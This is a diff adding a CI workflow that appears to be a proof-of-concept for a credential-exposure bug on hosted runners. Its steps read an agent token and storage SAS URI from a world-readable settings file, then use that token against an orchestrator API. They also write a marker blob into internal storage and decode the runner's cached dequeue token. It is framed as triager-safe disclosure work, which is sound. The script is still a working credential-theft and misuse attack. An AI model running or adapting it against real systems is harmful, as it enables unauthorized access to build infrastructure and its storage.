@@ -1,0 +1,63 @@
+name: "repro-f004 — triager-safe: prints only status codes, never secrets"
+on:
+  workflow_dispatch:
+jobs:
+  repro:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: 1 - show the credential file exists and its permissions
+        run: |
+          ls -la /opt/hca/.settings /opt/hca/diagnostics.json 2>&1
+          echo "current user: $(id -un) (uid $(id -u)) — note: NO sudo used anywhere below"
+
+      - name: 2 - load agent identity without printing it
+        run: |
+          cat /opt/hca/.settings > /tmp/s.json
+          python3 - <<'EOF'
+          import json
+          s = json.load(open('/tmp/s.json'))
+          open('/tmp/tok','w').write(s['authToken'])
+          open('/tmp/orch','w').write(s.get('schedulerApiUrl','').rstrip('/'))
+          d = json.load(open('/tmp/s.json'))
+          open('/tmp/sas','w').write(s.get('diagnosticsSasUri',''))
+          print("authToken bytes:", len(s['authToken']))
+          print("schedulerApiUrl host:", s.get('schedulerApiUrl','').split('/')[2])
+          print("sas present:", bool(s.get('diagnosticsSasUri')))
+          EOF
+
+      - name: 3 - orchestrator auth discriminator (in-VM, codes only)
+        run: |
+          TOK=$(cat /tmp/tok); ORCH=$(cat /tmp/orch)
+          echo "with agent token:    HTTP $(curl -sS -m 10 -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $TOK" "$ORCH/")"
+          echo "without any token:   HTTP $(curl -sS -m 10 -o /dev/null -w '%{http_code}' "$ORCH/")"
+          echo "GET /request (worker state): HTTP $(curl -sS -m 10 -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $TOK" "$ORCH/request")"
+
+      - name: 4 - internal storage write via the file's SAS (status code only)
+        run: |
+          SAS=$(cat /tmp/sas)
+          if [ -z "$SAS" ]; then echo "no sas in .settings this boot"; exit 0; fi
+          BASE=$(echo "$SAS" | cut -d'?' -f1); P=$(echo "$SAS" | cut -d'?' -f2)
+          echo "storage account: $(echo "$BASE" | cut -d/ -f3)"
+          echo "PUT marker blob: HTTP $(curl -sS -m 15 -o /dev/null -w '%{http_code}' -X PUT "$BASE/repro-f004-$(date -u +%Y%m%dT%H%M%SZ).txt?$P" -H 'x-ms-blob-type: BlockBlob' --data-binary 'repro-f004 authorized engagement marker')"
+
+      - name: 5 - runner dequeue credential also world-readable (proof of read, no content)
+        run: |
+          RD=/home/runner/actions-runner/cached/2.337.0
+          ls -la $RD/.credentials $RD/.runner 2>&1
+          python3 - <<'EOF'
+          import json, base64
+          try:
+              d = json.load(open('/home/runner/actions-runner/cached/2.337.0/.credentials'))
+              data = d.get('Data', d)
+              t = data.get('token', '')
+              if t:
+                  pl = t.split('.')[1]
+                  p = json.loads(base64.urlsafe_b64decode(pl + '=' * (-len(pl) % 4)))
+                  print("runner token scheme:", data.get('Scheme', '(scheme key absent)'))
+                  print("runner token claims (non-secret): lifetime hours =", round((p.get('exp',0)-p.get('iat',0))/3600, 2), "| runner_type =", p.get('runner_type'), "| iss =", p.get('iss'))
+              else:
+                  print(".credentials present but no token key this cycle:", list(data.keys()))
+          except Exception as e:
+              print(".credentials read error:", e)
+          EOF
